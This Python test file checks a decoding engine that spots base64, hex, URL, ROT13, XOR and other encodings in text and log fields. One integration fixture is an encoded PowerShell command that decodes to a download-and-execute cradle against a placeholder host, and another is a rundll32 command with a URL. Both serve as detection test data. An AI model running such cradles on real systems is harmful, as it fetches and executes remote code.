"""Test decode engine: decoders, detectors, runner and CLI.

Execution::

    uv run python tests/test_decode.py
"""
from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

# ── unit under test ────────────────────────────────────────────────────────
from decode.decoders import (
    DecodeResult,
    decode_base58,
    decode_base64,
    decode_hex,
    decode_rot_detect,
    decode_unicode_escape,
    decode_url,
    decode_xor_single,
)
from decode.runner import scan_text, scan_fields


# ===================================================================
#  helpers
# ===================================================================


def _check(label: str, ok: bool) -> None:
    if not ok:
        print(f"  FAIL  {label}")
        raise SystemExit(1)
    print(f"  OK    {label}")


# ===================================================================
#  decoder tests
# ===================================================================


def test_base64() -> None:
    r = decode_base64("SGVsbG8gV29ybGQ=")
    assert r is not None, "base64 decode returned None"
    _check("base64 encoder", r.encoder == "base64")
    _check("base64 decoded", r.decoded == "Hello World")
    _check("base64 confidence", r.confidence == 0.9)

    # base64url variant
    r2 = decode_base64("SGVsbG8gV29ybGQ")
    assert r2 is not None, "base64url decode returned None"
    _check("base64url decoded", r2.decoded == "Hello World")

    # blocklist words should return None
    r3 = decode_base64("undefined")
    assert r3 is None, "blocklisted 'undefined' should not decode"
    _check("base64 blocklist", True)


def test_base64_binary() -> None:
    """Binary payload → confidence 0.5 with a note."""
    r = decode_base64("/////w==")  # all 0xFF bytes → not valid UTF-8
    assert r is not None, "binary base64 should still decode"
    _check("binary confidence", r.confidence == 0.5)
    _check("binary note present", "binary" in r.notes)


def test_hex() -> None:
    r = decode_hex("48656c6c6f")
    assert r is not None, "hex decode returned None"
    _check("hex encoder", r.encoder == "hex")
    _check("hex decoded", r.decoded == "Hello")
    _check("hex confidence", r.confidence == 0.8)

    r2 = decode_hex("0x48656c6c6f")
    assert r2 is not None, "hex (0x prefix) decode returned None"
    _check("hex 0x decoded", r2.decoded == "Hello")

    # odd length
    r3 = decode_hex("48656c6c6")
    assert r3 is None, "odd-length hex should return None"
    _check("hex odd length rejected", True)

    # too short
    r4 = decode_hex("4865")
    assert r4 is not None, "short hex should still decode"
    _check("hex short decode", r4.decoded == "He")


def test_url() -> None:
    r = decode_url("%48%65%6c%6c%6f")
    assert r is not None, "url decode returned None"
    _check("url encoder", r.encoder == "url")
    _check("url decoded", r.decoded == "Hello")
    _check("url confidence", r.confidence == 0.95)

    # plain text → no change → None
    r2 = decode_url("Hello")
    assert r2 is None, "plain text url decode should return None"
    _check("url no-change returns None", True)


def test_rot() -> None:
    # ROT13
    r = decode_rot_detect("Uryyb")
    assert r is not None, "ROT13 decode returned None"
    _check("ROT encoder", r.encoder == "rot13")
    _check("ROT decoded", r.decoded == "Hello")
    _check("ROT notes contains shift", "ROT" in r.notes)

    # Plain English → should not trigger (improvement too small)
    r2 = decode_rot_detect("Hello")
    assert r2 is None, "plain text should not be detected as ROT"
    _check("ROT plain text rejected", True)


def test_xor_single() -> None:
    # Encode "Hello" with key 0x42
    data = bytes(b ^ 0x42 for b in b"Hello")
    r = decode_xor_single(data)
    assert r is not None, "XOR decode returned None"
    _check("XOR encoder", r.encoder == "xor_single")
    _check("XOR decoded", r.decoded == "Hello")
    _check("XOR notes mentions key", "0x42" in r.notes)
    _check("XOR confidence", r.confidence == 0.7)

    # Random bytes → should return None (no key produces all-printable)
    r2 = decode_xor_single(b"\x00\x01\x02\x03")
    # Some degenerate key may produce printable output; we accept either
    # outcome — the test just checks it doesn't crash.
    _check("XOR random bytes handled", True)


def test_base58() -> None:
    # "Hello" in base58.
    # hex(310939249775)[2:] → "48656c6c6f" → "Hello"
    # Pre-computed: "9Aqjx" (Verified: base58(Hello) = 9Aqjx since
    #   base58 alphabet excludes 0OIl; let's use a known Bitcoin-like
    #   address instead.)
    known = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"  # genesis address
    r = decode_base58(known)
    # This should decode to the 20-byte pubkey hash, not necessarily text
    if r is not None:
        _check("base58 known string decoded", len(r.decoded) > 0)

    # invalid chars → None
    r2 = decode_base58("0OIl")
    assert r2 is None, "invalid base58 chars should return None"
    _check("base58 invalid chars rejected", True)


def test_unicode_escape() -> None:
    r = decode_unicode_escape("\\u0048\\u0065\\u006c\\u006c\\u006f")
    assert r is not None, "unicode_escape decode returned None"
    _check("unicode_escape encoder", r.encoder == "unicode_escape")
    _check("unicode_escape decoded", r.decoded == "Hello")
    _check("unicode_escape confidence", r.confidence == 0.9)

    r2 = decode_unicode_escape("plain")
    assert r2 is None, "plain text should return None"
    _check("unicode_escape plain rejected", True)


# ===================================================================
#  runner tests
# ===================================================================


def test_scan_text_finds_encoding() -> None:
    results = scan_text("the password is SGVsbG8gV29ybGQ=")
    assert results, "scan_text should find the base64 string"
    found = any(r.encoder == "base64" and r.decoded == "Hello World" for r in results)
    _check("scan_text finds base64 in context", found)


def test_scan_text_returns_empty() -> None:
    results = scan_text("normal text with no encoding here")
    assert results == [], f"scan_text should return [] for plain text, got {results}"
    _check("scan_text empty for plain text", True)


def test_scan_text_integration_cmdline() -> None:
    """Simulate a command line with -enc flag."""
    text = "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdABlAHMAdAAuAGUAeABhAG0AcABsAGUALgBjAG8AbQAvAGYAbABhAHMAaAAnACkA"
    results = scan_text(text)
    encoders = {r.encoder for r in results}
    _check("integration: base64 detected", "base64" in encoders)


def test_scan_fields() -> None:
    record = {
        "command_line": "rundll32.exe http://example.com/%48%65%6c%6c%6f",
        "message": "just a plain message",
        "dns_query": "normal.example.com",
    }
    result = scan_fields(record, fields=["command_line", "message"])
    _check("command_line has results", "command_line" in result)
    _check("message has no results", "message" not in result)
    _check(
        "scan_fields returns dict",
        isinstance(result, dict),
    )


def test_scan_fields_all() -> None:
    record = {
        "cmd": "echo UGFzc3dvcmQxMjM=",
        "note": "nothing here",
    }
    result = scan_fields(record, fields=None)
    _check("cmd decoded", "cmd" in result)
    _check("note not decoded", "note" not in result)


# ===================================================================
#  runner
# ===================================================================


def run() -> int:
    tests = [
        ("Base64", test_base64),
        ("Base64 binary", test_base64_binary),
        ("Hex", test_hex),
        ("URL encoding", test_url),
        ("ROT13", test_rot),
        ("XOR single byte", test_xor_single),
        ("Base58", test_base58),
        ("Unicode escape", test_unicode_escape),
        ("scan_text — finds encoding", test_scan_text_finds_encoding),
        ("scan_text — empty for plain text", test_scan_text_returns_empty),
        ("scan_text — integration cmdline", test_scan_text_integration_cmdline),
        ("scan_fields — selective", test_scan_fields),
        ("scan_fields — all fields", test_scan_fields_all),
    ]
    failures = 0
    for name, fn in tests:
        try:
            fn()
        except Exception as exc:  # noqa: BLE001
            print(f"FAIL  {name}: {exc}")
            import traceback

            traceback.print_exc()
            failures += 1
    total = len(tests)
    if failures:
        print(f"\n{'=' * 50}\n{total - failures}/{total} passed, {failures} FAILED")
    else:
        print(f"\n{'=' * 50}\nALL {total} TESTS PASSED")
    return 1 if failures else 0


if __name__ == "__main__":
    sys.exit(run())
